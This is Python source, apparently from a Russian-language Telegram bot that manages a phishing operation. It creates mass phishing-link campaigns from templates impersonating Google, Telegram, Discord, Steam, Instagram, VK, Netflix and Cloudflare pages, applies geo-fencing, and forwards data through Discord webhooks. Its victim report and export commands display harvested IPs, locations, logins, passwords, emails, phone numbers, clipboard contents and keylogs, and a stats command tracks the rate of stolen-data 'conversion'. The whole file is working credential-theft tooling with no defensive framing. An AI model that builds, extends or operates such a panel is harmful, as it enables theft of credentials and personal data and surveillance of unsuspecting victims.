async def cmd_domain(message: Message, command: CommandObject):
    domain = command.args.strip() if command.args else ""
    if not domain:
        await message.answer("Использование: /domain твойдомен.eu.cc")
        return
    await set_user_domain(message.from_user.id, domain)
    await message.answer(f"✅ Домен установлен: <code>{domain}</code>")

@dp.message(Command("webhook"))
async def cmd_webhook(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
    if args.startswith("discord "):
        url = args.replace("discord ", "", 1).strip()
        await set_webhook_discord(message.from_user.id, 1, url)
        await message.answer("✅ Discord webhook установлен.")
    else:
        await message.answer("Использование: /webhook discord <url>")

@dp.message(Command("fence"))
async def cmd_fence(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
    if args.startswith("add "):
        country = args.replace("add ", "", 1).strip().upper()
        await add_geo_fence(message.from_user.id, country)
        await message.answer(f"✅ Страна заблокирована: {country}")
    elif args == "list":
        fences = await get_geo_fences(message.from_user.id)
        if not fences:
            await message.answer("Гео-фенсы не установлены.")
            return
        text = "<b>Гео-фенсы:</b>\n"
        for f in fences:
            text += f"├ #{f['id']} | {f['country']} | действие: {f['action']}\n"
        await message.answer(text)
    elif args.startswith("remove "):
        fid = args.replace("remove ", "", 1).strip()
        try:
            await remove_geo_fence(int(fid))
            await message.answer("✅ Фенс удалён.")
        except:
            await message.answer("Неверный ID")
    else:
        await message.answer("Использование: /fence add <страна> | list | remove <id>")

@dp.message(Command("campaign"))
async def cmd_campaign(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
    parts = args.split()
    if len(parts) < 3:
        await message.answer("Использование: /campaign <название> <шаблон> <кол-во>\nШаблоны: cf, google, telegram, discord, steam, instagram, vk, netflix, age, update")
        return

    name, template, count_str = parts[0], parts[1], parts[2]
    try:
        count = min(int(count_str), 50)
    except:
        await message.answer("Количество должно быть числом (макс 50)")
        return

    if template not in LANDING_CACHE:
        await message.answer(f"Неизвестный шаблон: {template}. Доступны: {', '.join(LANDING_CACHE.keys())}")
        return

    campaign_id = generate_link_id()
    await create_campaign(campaign_id, message.from_user.id, name, template, LINK_TTL_HOURS)

    user = await get_user(message.from_user.id)
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")

    created = 0
    for _ in range(count):
        link_id = generate_link_id()
        full_url = f"{domain}/l/{link_id}"
        await create_link(link_id, campaign_id, message.from_user.id, template, link_id[:8], full_url, LINK_TTL_HOURS)
        created += 1

    await message.answer(
        f"✅ <b>Кампания создана</b>\n"
        f"├ Название: {name}\n"
        f"├ Шаблон: {template}\n"
        f"├ Ссылок: {created}\n"
        f"├ /campaign_stats {campaign_id}"
    )

@dp.message(Command("campaign_stats"))
async def cmd_campaign_stats(message: Message, command: CommandObject):
    cid = command.args.strip() if command.args else ""
    if not cid:
        await message.answer("Использование: /campaign_stats <campaign_id>")
        return
    campaign = await get_campaign(cid)
    if not campaign:
        await message.answer("Кампания не найдена")
        return
    links = await get_user_links(message.from_user.id)

    total_hits = sum(l["hits"] for l in links if l["campaign_id"] == cid)
    total_data = sum(l["data_received"] for l in links if l["campaign_id"] == cid)
    camp_links = [l for l in links if l["campaign_id"] == cid]

    await message.answer(
        f"<b>📊 Кампания: {campaign['name']}</b>\n"
        f"├ Шаблон: {campaign['template']}\n"
        f"├ Ссылок: {len(camp_links)}\n"
        f"├ Всего переходов: {total_hits}\n"
        f"├ Данных получено: {total_data}\n"
        f"├ Создана: {campaign['created_at']}\n"
        f"└ Истекает: {campaign['expires_at']}"
    )

@dp.message(Command("export"))
async def cmd_export(message: Message, command: CommandObject):
    link_id = command.args.strip() if command.args else ""
    if not link_id:
        await message.answer("Использование: /export <link_id> | /export all")
        return

    victims = await get_victims(link_id) if link_id != "all" else []
    if not victims:
        await message.answer("Жертвы не найдены")
        return

    data = [dict(v) for v in victims]
    # Очищаем большие поля для читаемости
    for d in data:
        if d.get("photo"):
            d["photo"] = f"[base64 {len(d['photo'])} chars]"
        if d.get("screenshot"):
            d["screenshot"] = f"[base64 {len(d['screenshot'])} chars]"

    import io
    buf = io.StringIO()
    json.dump(data, buf, indent=2, ensure_ascii=False, default=str)
    content = buf.getvalue().encode("utf-8")

    await message.answer_document(
        BufferedInputFile(content, filename=f"victims_{link_id}.json"),
        caption=f"📦 Экспортировано жертв: {len(victims)}"
    )

@dp.message(Command("victim"))
async def cmd_victim(message: Message, command: CommandObject):
    link_id = command.args.strip() if command.args else ""
    if not link_id:
        await message.answer("Использование: /victim <link_id>")
        return

    victims = await get_victims(link_id)
    if not victims:
        await message.answer("Жертв по этой ссылке нет")
        return

    v = victims[0]
    text = (
        f"<b>🎯 Отчёт по жертве</b>\n"
        f"├ IP: <code>{v['ip']}</code>\n"
        f"├ Страна: {v.get('country', '—')} / {v.get('city', '—')}\n"
        f"├ ISP: {v.get('isp', '—')}\n"
        f"├ Платформа: {v.get('platform', '—')}\n"
        f"├ Экран: {v.get('screen', '—')}\n"
        f"├ Язык: {v.get('language', '—')}\n"
        f"├ Таймзона: {v.get('timezone', '—')}\n"
        f"├ VPN: {'⚠️ Да' if v.get('vpn') else '✅ Нет'}\n"
    )
    if v.get("login"):
        text += f"\n<b>✧ Креды</b>\n"
        text += f"├ Логин: <code>{v['login']}</code>\n"
        text += f"├ Пароль: <code>{v.get('password', '')}</code>\n"
    if v.get("email"):
        text += f"├ Email: <code>{v['email']}</code>\n"
    if v.get("phone"):
        text += f"├ Телефон: <code>{v['phone']}</code>\n"
    if v.get("clipboard"):
        text += f"\n<b>📋 Буфер обмена</b>\n<code>{v['clipboard'][:300]}</code>\n"
    if v.get("keylog"):
        text += f"\n<b>⌨️ Кейлог</b>\n<code>{v['keylog'][:300]}</code>\n"

    await message.answer(text, disable_web_page_preview=True)

@dp.message(Command("links"))
async def cmd_links(message: Message):
    links = await get_user_links(message.from_user.id)
    if not links:
        await message.answer("Нет активных ссылок.")
        return
    text = "<b>Твои ссылки:</b>\n"
    for l in links[:15]:
        text += f"├ <code>{l['id'][:10]}</code> {l['template']} | 👁 {l['hits']}\n"
    await message.answer(text)

@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    tg_id = message.from_user.id
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    total_hits = sum(l["hits"] for l in links)
    total_data = sum(l["data_received"] for l in links)

    await message.answer(
        f"<b>📊 Общая статистика</b>\n"
        f"├ Активных ссылок: {len(links)}\n"
        f"├ Всего жертв: {v_count}\n"
        f"├ Всего переходов: {total_hits}\n"
        f"├ Данных получено: {total_data}\n"
        f"├ Конверсия: {(total_data/total_hits*100) if total_hits else 0:.1f}%"
    )

# ── ЗАПУСК ──
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="0.0.0.0", port=8080, reload=False)
